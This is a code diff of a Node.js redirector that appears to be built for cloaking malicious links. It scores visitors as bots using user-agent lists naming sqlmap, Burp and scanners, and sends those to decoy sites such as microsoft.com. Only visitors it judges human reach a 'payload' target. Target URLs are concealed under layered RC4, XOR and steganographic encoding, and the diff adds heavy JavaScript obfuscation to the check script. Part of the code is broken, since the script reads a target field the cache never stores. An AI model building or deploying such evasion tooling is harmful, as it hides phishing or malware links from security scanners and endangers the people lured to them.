@@ -5,31 +5,29 @@ const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
 const fetch = require('node-fetch');
 const NodeCache = require('node-cache');
+const JavaScriptObfuscator = require('javascript-obfuscator');
 
 const app = express();
-
 app.set('trust proxy', 1);
 
-// CONFIG
-const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
-const BOT_URLS = [
+// ─── Config ──────────────────────────────────────────────────────────────────
+const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
+const BOT_URLS     = [
   'https://www.microsoft.com',
   'https://www.apple.com',
-  'https://en.wikipedia.org/wiki/Main_Page',
   'https://www.google.com',
-  'https://www.bbc.com',
-  'https://www.youtube.com'
+  'https://en.wikipedia.org/wiki/Main_Page',
+  'https://www.bbc.com'
 ];
 
-const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
-const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
+const LOG_FILE     = 'clicks.log';
+const PORT         = process.env.PORT || 10000;
+const LINK_TTL_SEC = 1800;
 
-const LOG_FILE = 'clicks.log';
-const PORT = process.env.PORT || 10000;
+const geoCache  = new NodeCache({ stdTTL: 86400 });
+const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC });
 
-const geoCache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });
-
-// MIDDLEWARE
+// ─── Middleware ──────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
   next();
@@ -39,325 +37,326 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
-      styleSrc: ["'self'", "'unsafe-inline'"],
-      imgSrc: ["'self'", 'data:'],
+      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
+      styleSrc:   ["'self'", "'unsafe-inline'"],
+      imgSrc:     ["'self'", 'data:'],
       connectSrc: ["'self'"],
-      frameSrc: ["'self'"],
-    },
-  },
+      frameSrc:   ["'self'"]
+    }
+  }
 }));
 
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
+app.get(['/ping','/health','/healthz','/status'], (_, res) => res.status(200).send('OK'));
 
-function isMobile(req) {
-  return /android|iphone|ipad|ipod|mobi/i.test((req.headers['user-agent'] || '').toLowerCase());
-}
+// ─── Helpers ─────────────────────────────────────────────────────────────────
+const isMobile = req => /Mobi|Android|iPhone|iPad|iPod/i.test(req.headers['user-agent'] || '');
 
-// SERVER BOT DETECTION (unchanged)
 const strictLimiter = rateLimit({
-  windowMs: 60 * 1000,
-  max: (req) => isMobile(req) ? 12 : 4,
+  windowMs: 60000,
+  max: req => isMobile(req) ? 15 : 5,
   standardHeaders: true,
-  legacyHeaders: false,
+  legacyHeaders: false
 });
-
-const suspiciousUA = [
-  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
-  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
-  /zoomeye/i, /nmap/i, /gobuster/i
-];
 
 function isLikelyBot(req) {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
-  const ref = (req.headers['referer'] || '').toLowerCase();
-  const accept = req.headers['accept'] || '';
-
+  const h  = req.headers;
   let score = 0;
-  if (suspiciousUA.some(r => r.test(ua))) score += 40;
-  if (!ua.includes('mozilla')) score += 25;
-  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 20;
-  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 15;
-  if (!accept.includes('text/html')) score += 15;
 
-  if (!isMobile(req)) {
-    if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) score += 30;
-    if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) score += 30;
-  }
+  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap/i.test(ua)) score += 50;
+  if (!ua.includes('mozilla')) score += 30;
+  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) score += 35;
+  if (!h['accept-language'] || h['accept-language'].length < 5) score += 20;
+  if (Object.keys(h).length < 11) score += 25;
 
-  if (!req.headers['upgrade-insecure-requests']) score += 18;
-  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 20;
-  if (Object.keys(req.headers).length < 12) score += 25;
-
-  const keys = Object.keys(req.headers);
-  if (keys.join() === [...keys].sort().join()) score += 25;
-
-  console.log(`[BOT-SCORE] Mobile=${isMobile(req)} | Score=${score} | UA=${ua.substring(0,100)}...`);
-
-  return score >= 70;
+  return score >= 75;
 }
 
-// GEO (unchanged)
 async function getCountryCode(req) {
-  let ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) ||
-           req.headers['x-real-ip'] ||
-           req.ip || 'unknown';
+  const ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) || req.ip || '??';
+  if (ip.match(/^(127\.|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) return 'XX';
 
-  if (ip === 'unknown' || ip.match(/^(127\.|::1$|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) {
-    return 'XX';
-  }
-
-  let cached = geoCache.get(ip);
-  if (cached) return cached;
-
-  const token = process.env.IPINFO_TOKEN;
-  if (!token) return 'XX';
+  let cc = geoCache.get(ip);
+  if (cc) return cc;
 
   try {
-    const res = await fetch(`https://api.ipinfo.io/${ip}/country?token=${token}`, {
-      timeout: 4000,
-      headers: { 'User-Agent': 'godmode-redirector/1.0' }
+    const token = process.env.IPINFO_TOKEN;
+    if (!token) return 'XX';
+
+    const res = await fetch(`https://ipinfo.io/${ip}/country?token=${token}`, {
+      timeout: 3500,
+      headers: { 'User-Agent': 'redir/1.0' }
     });
 
     if (res.ok) {
       const data = await res.json();
-      const cc = data.country?.toUpperCase();
-      if (cc && /^[A-Z]{2}$/.test(cc)) {
+      cc = data.country?.toUpperCase();
+      if (/^[A-Z]{2}$/.test(cc)) {
         geoCache.set(ip, cc);
         return cc;
       }
     }
-  } catch (e) {
-    console.error(`[GEO-ERR] ${ip} → ${e.message}`);
-  }
+  } catch {}
 
   return 'XX';
 }
 
-// ENCODERS (unchanged)
+// ─── Encoders (RC4 fixed) ────────────────────────────────────────────────────
 const encoders = [
-  { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
-  { name: 'rot13',
+  { name: 'hex',       enc: s => Buffer.from(s).toString('hex'),       dec: s => Buffer.from(s, 'hex').toString() },
+  { name: 'rot13', 
     enc: s => s.replace(/[a-zA-Z]/g, c => {
-      const base = c <= 'Z' ? 65 : 97;
-      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
-    }),
+      const b = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
+    }), 
     dec: s => s.replace(/[a-zA-Z]/g, c => {
-      const base = c <= 'Z' ? 65 : 97;
-      return String.fromCharCode(((c.charCodeAt(0) - base - 13 + 26) % 26) + base);
+      const b = c <= 'Z' ? 65 : 97;
+      return String.fromCharCode(((c.charCodeAt(0) - b - 13 + 26) % 26) + b);
     })
   },
-  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
-  { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
+  { name: 'xor', needsKey: true,
+    enc: (s, key) => Buffer.from(s.split('').map((c,i) => c.charCodeAt(0) ^ Buffer.from(key, 'hex')[i % key.length])).toString('base64url'),
+    dec: (s, key) => {
+      const k = Buffer.from(key, 'hex');
+      const buf = Buffer.from(s, 'base64url');
+      return buf.map((b,i) => String.fromCharCode(b ^ k[i % k.length])).join('');
+    }
+  },
+  { name: 'rc4', needsKey: true, // FIXED KSA + PRGA
+    enc: (s, key) => {
+      const k = Buffer.from(key, 'hex');
+      let state = Array.from({length:256}, (_,i)=>i);
+      let j = 0;
+      for (let i = 0; i < 256; i++) {
+        j = (j + state[i] + k[i % k.length]) % 256;
+        [state[i], state[j]] = [state[j], state[i]];
+      }
+      let out = '';
+      let i = 0; j = 0;
+      for (let byte of Buffer.from(s)) {
+        i = (i + 1) % 256;
+        j = (j + state[i]) % 256;
+        [state[i], state[j]] = [state[j], state[i]];
+        out += String.fromCharCode(byte ^ state[(state[i] + state[j]) % 256]);
+      }
+      return Buffer.from(out).toString('base64url');
+    },
+    dec: (s, key) => encoders.find(e=>e.name==='rc4').enc(Buffer.from(s,'base64url').toString(), key) // symmetric
+  },
+  { name: 'unicode-stego',
+    enc: s => {
+      let out = '';
+      for (let byte of Buffer.from(s)) {
+        out += String.fromCodePoint(0xFE00 + (byte >> 4));
+        out += String.fromCodePoint(0xE000 + (byte & 0x0F));
+      }
+      return out;
+    },
+    dec: s => {
+      let bytes = [];
+      for (let i = 0; i < s.length - 1; i += 2) {
+        const hi = s.codePointAt(i) - 0xFE00;
+        const lo = s.codePointAt(i+1) - 0xE000;
+        if (hi >= 0 && hi <= 15 && lo >= 0 && lo <= 15) {
+          bytes.push((hi << 4) | lo);
+        }
+      }
+      return Buffer.from(bytes).toString('utf8');
+    }
+  }
 ];
 
+// ─── Encoding / Decoding ─────────────────────────────────────────────────────
 function multiLayerEncode(str) {
   let result = str;
-  const noise = crypto.randomBytes(8).toString('hex');
+  const noiseLen = 5 + Math.floor(Math.random() * 11);
+  const noise = crypto.randomBytes(noiseLen).toString('hex');
   result = noise + result + noise;
 
-  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
-  const selected = shuffled.slice(0, 5);
+  const integrityKey = crypto.randomBytes(8).toString('hex');
+  const hmac = crypto.createHmac('sha256', integrityKey).update(result).digest('base64url');
+  result += `|${hmac}|${integrityKey}`;
 
+  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
+  const selected = shuffled.slice(0, 5 + Math.floor(Math.random() * 4));
+
+  const layerHistory = [];
   for (const layer of selected) {
-    result = layer.enc(result);
+    let key = layer.needsKey ? crypto.randomBytes(8 + Math.floor(Math.random() * 9)).toString('hex') : null;
+    result = key ? layer.enc(result, key) : layer.enc(result);
+    layerHistory.push({ name: layer.name, key });
   }
 
-  result = encodeURIComponent(result);
-  result = encodeURIComponent(result);
+  result = Buffer.from(result).toString('base64url');
 
-  return { encoded: result, layers: selected.map(e => e.name).reverse(), noise };
+  return { encoded: result, layers: layerHistory.reverse() };
 }
 
-function multiLayerDecode(encoded, layers, noise) {
-  let result = decodeURIComponent(decodeURIComponent(encoded));
+function multiLayerDecode(encoded, layers) {
+  let result;
+  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch { return null; }
 
-  for (const layerName of layers) {
-    const layer = encoders.find(e => e.name === layerName);
-    if (layer) result = layer.dec(result);
+  const parts = result.split('|');
+  if (parts.length >= 3) {
+    const payload = parts[0], received = parts[1], key = parts[2];
+    if (crypto.createHmac('sha256', key).update(payload).digest('base64url') !== received) return null;
+    result = payload;
   }
 
-  if (result.startsWith(noise) && result.endsWith(noise)) {
-    result = result.slice(noise.length, -noise.length);
+  for (const { name, key } of layers) {
+    const layer = encoders.find(e => e.name === name);
+    if (!layer) continue;
+    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch { return null; }
   }
+
+  const noiseGuess = Math.floor(result.length * 0.07);
+  if (result.length > noiseGuess * 2 + 20) result = result.slice(noiseGuess, -noiseGuess);
 
   return result;
 }
 
-app.get('/generate', (req, res) => {
-  const target = req.query.target || TARGET_URL;
-  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();
+// ─── Generate ────────────────────────────────────────────────────────────────
+app.get('/g', (req, res) => {
+  const target = req.query.t || TARGET_URL;
+  const payload = target + '#' + crypto.randomBytes(6).toString('hex') + '-' + Date.now();
 
-  const { encoded, layers, noise } = multiLayerEncode(noisy);
-  const layersEnc = Buffer.from(JSON.stringify({ layers, noise })).toString('base64url');
+  const { encoded, layers } = multiLayerEncode(payload);
+  const layersB64 = Buffer.from(JSON.stringify(layers)).toString('base64url');
 
-  const segments = Array(6).fill().map((_, i) =>
-    crypto.randomBytes(8).toString('hex') +
-    Math.random().toString(36).substring(2, 12).toUpperCase() +
-    (i % 2 ? 'verify' : 'session')
-  );
+  const id = crypto.randomBytes(10).toString('hex');
+  linkCache.set(id, { e: encoded, l: layersB64 });
 
-  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;
-
-  const params = [];
-  const keys = ['sid','tok','ref','utm_src','clid','ver','ts','hmac','nonce','_t','cid','fid','l'];
-  for (let i = 0; i < 13; i++) {
-    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
-    const v = k.startsWith('l') ? layersEnc : encodeURIComponent(crypto.randomBytes(12).toString('base64url'));
-    params.push(`${k}=${v}`);
-  }
-
-  const url = `https://${req.hostname}${path}?p=${encoded}&${params.join('&')}&v=8.1.${Math.floor(Math.random()*100)}`;
-
-  res.json({ success: true, tracked: url });
+  res.json({ success: true, url: `https://${req.hostname}/v/${id}` });
 });
 
-// OPTIMIZED /r/* ROUTE
-app.get('/r/*', strictLimiter, async (req, res) => {
-  const ua = req.headers['user-agent'] || '';
-  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
-
+// ─── Verification gate ───────────────────────────────────────────────────────
+app.get('/v/:id', strictLimiter, async (req, res) => {
+  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
   const country = await getCountryCode(req);
+  const ua = req.headers['user-agent'] || '';
 
-  let geoAllowed = true;
-  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
-  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;
-
-  if (!geoAllowed || isLikelyBot(req)) {
-    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BLOCK ${ip} ${country} UA:${ua}\n`, () => {});
+  if (isLikelyBot(req)) {
+    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`, ()=>{});
     return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
 
-  fs.appendFile(LOG_FILE, `${new Date().toISOString()} PASS ${ip} ${country} UA:${ua}\n`, () => {});
+  fs.appendFile(LOG_FILE, `${new Date().toISOString()} VIEW ${ip} ${country}\n`, ()=>{});
 
-  let redirectTarget = TARGET_URL;
-  try {
-    const params = new URLSearchParams(req.url.split('?')[1] || '');
-    const enc = params.get('p') || '';
-    const layersB64 = params.get('l') || '';
+  const data = linkCache.get(req.params.id);
+  if (!data) return res.redirect(BOT_URLS[0]);
 
-    if (enc && layersB64) {
-      let layersData;
-      try {
-        layersData = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
-      } catch {
-        layersData = { layers: [], noise: '' };
-      }
+  const hpSuffix = crypto.randomBytes(5).toString('hex');
 
-      let decoded = multiLayerDecode(enc, layersData.layers, layersData.noise);
-      decoded = decoded.split('#')[0];
-      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;
+  const rawChallenge = `
+  (function(){
+    const T = '${data.target.replace(/'/g,"\\'")}';
+    const B = '${BOT_URLS[0]}';
 
-      try {
-        const urlObj = new URL(decoded);
-        if (['http:', 'https:'].includes(urlObj.protocol)) {
-          redirectTarget = decoded;
-        }
-      } catch {}
+    let moves=0, ent=0, lx=0, ly=0, lt=Date.now();
+    let mot=0, tiltE=0, lb=null, lg=null;
+    let comp=0, compE=0, la=null;
+    let hasM=false, hasO=false, hasCV=false;
+    let touch=false;
+
+    function ue(dx,dy){const dt=(Date.now()-lt)/1e3||1;ent+=Math.log2(1+Math.hypot(dx,dy))/dt*1.35;lt=Date.now();moves++}
+
+    addEventListener('mousemove',e=>{if(lx&&ly)ue(Math.abs(e.clientX-lx),Math.abs(e.clientY-ly));lx=e.clientX;ly=e.clientY},{passive:true});
+    addEventListener('touchmove',e=>{if(e.touches?.length){const t=e.touches[0];if(lx&&ly)ue(Math.abs(t.clientX-lx),Math.abs(t.clientY-ly));lx=t.clientX;ly=t.clientY}},{passive:true});
+    addEventListener('touchstart',()=>{touch=true},{once:true,passive:true});
+
+    addEventListener('devicemotion',e=>{hasM=true;mot++;if(e.accelerationIncludingGravity){const a=e.accelerationIncludingGravity;tiltE+=Math.abs(a.x||0)+Math.abs(a.y||0)+Math.abs(a.z||0)*0.6}if(e.rotationRate)tiltE+=(Math.abs(e.rotationRate.alpha||0)+Math.abs(e.rotationRate.beta||0)+Math.abs(e.rotationRate.gamma||0))*0.4},{passive:true});
+
+    addEventListener('deviceorientation',e=>{hasO=true;mot++;if(typeof e.alpha==='number'&&!isNaN(e.alpha)){comp++;if(la!==null){const d=Math.min(Math.abs(e.alpha-la),360-Math.abs(e.alpha-la));compE+=d*0.38;if(d>1.8)hasCV=true}la=e.alpha}if(typeof e.beta==='number'&&typeof e.gamma==='number'){if(lb!==null&&lg!==null)tiltE+=(Math.abs(e.beta-lb)+Math.abs(e.gamma-lg))*0.35;lb=e.beta;lg=e.gamma}},{passive:true});
+
+    function hpFilled(){
+      return document.getElementById('hp_n_${hpSuffix}')?.value.trim() ||
+             document.getElementById('hp_e_${hpSuffix}')?.value.trim() ||
+             document.getElementById('hp_w_${hpSuffix}')?.value.trim() ||
+             document.getElementById('hp_c_${hpSuffix}')?.checked;
     }
-  } catch (e) {
-    console.error(`[DECODE-ERR] ${ip} → ${e.message}`);
-  }
 
-  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");
+    setTimeout(()=>{
+      const mob=/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      const minEnt=mob?0.75:5.2, minMov=mob?0:2, minTilt=mob?0.55:2.8, minComp=mob?2.0:0, minMot=mob?2:0;
 
-  const hpSuffix = crypto.randomBytes(4).toString('hex');
+      const sus = 
+        hpFilled() ||
+        ent < minEnt || moves < minMov ||
+        navigator.webdriver ||
+        (window.outerWidth===0||window.outerHeight===0) ||
+        (mob && mot < minMot) ||
+        (mob && tiltE < minTilt) ||
+        (mob && compE < minComp && comp>0) ||
+        (mob && comp===0 && hasO && !hasCV) ||
+        (mob && hasM && !touch);
 
-  res.send(`
-<!DOCTYPE html>
+      location = sus ? B : T;
+    },950+Math.random()*1050);
+  })();
+  `;
+
+  const obfJS = JavaScriptObfuscator.obfuscate(rawChallenge, {
+    compact: true,
+    controlFlowFlattening: true,
+    controlFlowFlatteningThreshold: 0.9,
+    deadCodeInjection: true,
+    deadCodeInjectionThreshold: 0.4,
+    stringArray: true,
+    stringArrayRotate: true,
+    stringArrayShuffle: true,
+    stringArrayWrappersCount: 2,
+    numbersToExpressions: true,
+    identifierNamesGenerator: 'mangled-shuffled',
+    transformObjectKeys: true,
+    disableConsoleOutput: true
+  }).getObfuscatedCode();
+
+  res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="refresh" content="8;url=${BOT_URLS[0]}">
   <title>Verifying...</title>
   <style>
-    body { margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
-    .visually-hidden { position:absolute !important; width:1px !important; height:1px !important; padding:0 !important; margin:-1px !important; overflow:hidden !important; clip:rect(0,0,0,0) !important; border:0 !important; }
+    body{margin:0;background:#000;color:#aaa;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;}
+    .visually-hidden{position:absolute !important;width:1px !important;height:1px !important;padding:0 !important;margin:-1px !important;overflow:hidden !important;clip:rect(0,0,0,0) !important;border:0 !important;}
+    .spinner {border:4px solid #333;border-top:4px solid #0f0;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:20px auto;}
+    @keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
-  <div>Verifying request •••</div>
-
-  <div class="visually-hidden">
-    <input type="text" id="hpw_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="text" id="hpc_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="text" id="hpe_${hpSuffix}" autocomplete="off" tabindex="-1">
-    <input type="checkbox" id="hpx_${hpSuffix}" tabindex="-1">
+  <div>
+    <div class="spinner"></div>
+    <p>Verifying request… please wait</p>
   </div>
 
-  <script nonce="${res.locals.nonce}">
-    const TARGET = '${safeTarget}';
-    const BOT = '${BOT_URLS[0]}';
+  <!-- Randomized honeypot field names -->
+  <div class="visually-hidden">
+    <label for="hp_n_${hpSuffix}">Name (leave empty)</label>
+    <input type="text" id="hp_n_${hpSuffix}" name="n" autocomplete="off" tabindex="-1">
 
-    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
-    let focusLost = 0;
+    <label for="hp_e_${hpSuffix}">Email (do not fill)</label>
+    <input type="email" id="hp_e_${hpSuffix}" name="e" autocomplete="off" tabindex="-1">
 
-    function updateEntropy(dx, dy) {
-      const dt = (Date.now() - lastTime) / 1000 || 1;
-      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.2; // very forgiving
-      lastTime = Date.now();
-      moves++;
-    }
+    <label for="hp_w_${hpSuffix}">Website (ignore)</label>
+    <input type="url" id="hp_w_${hpSuffix}" name="w" autocomplete="off" tabindex="-1">
 
-    document.addEventListener('mousemove', e => {
-      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY));
-      lastX = e.clientX; lastY = e.clientY;
-    }, {passive: true});
+    <label for="hp_c_${hpSuffix}">Agree (do not check)</label>
+    <input type="checkbox" id="hp_c_${hpSuffix}" name="c" tabindex="-1">
+  </div>
 
-    document.addEventListener('touchmove', e => {
-      if (e.touches?.length) {
-        const t = e.touches[0];
-        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY));
-        lastX = t.clientX; lastY = t.clientY;
-      }
-    }, {passive: true});
-
-    document.addEventListener('visibilitychange', () => { if (document.hidden) focusLost++; });
-
-    const c = document.createElement('canvas');
-    const ctx = c.getContext('2d');
-    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
-    ctx.fillStyle = '#069'; ctx.fillText('Hello, world!',2,15);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('Hello, world!',4,17);
-    const fp = c.toDataURL();
-
-    function isHoneypotFilled() {
-      return document.getElementById('hpw_${hpSuffix}')?.value.trim() ||
-             document.getElementById('hpc_${hpSuffix}')?.value.trim() ||
-             document.getElementById('hpe_${hpSuffix}')?.value.trim() ||
-             document.getElementById('hpx_${hpSuffix}')?.checked;
-    }
-
-    setTimeout(() => {
-      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-      const suspicious =
-        isHoneypotFilled() ||
-        entropy < (mobile ? 0.5 : 6) ||             // extremely forgiving on mobile
-        moves < (mobile ? 0 : 2) ||                 // 0 moves OK on phone
-        (fp.includes('iVBORw0KGgo') && !mobile) ||  // canvas only strict on desktop
-        navigator.webdriver === true ||
-        (window.outerWidth === 0 || window.outerHeight === 0);
-
-      console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled() ? 'FILLED' : 'empty'} fpSusp:\${fp.includes('iVBORw0KGgo') ? 'yes' : 'no'} → \${suspicious ? 'BOT' : 'HUMAN'}\`);
-
-      location.href = suspicious ? BOT : TARGET;
-    }, 800 + Math.random() * 1000); // fast: 0.8–1.8 seconds
-
-    setTimeout(() => location.href = BOT, 5000);
-  </script>
+  <script nonce="${res.locals.nonce}">${obfJS}</script>
 </body>
-</html>
-  `);
+</html>`);
 });
 
-app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
+app.use((_, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Optimized god-mode listening on ${PORT}`);
-});
+  console.log(`Hardened redirector listening on ${PORT}`);
+})
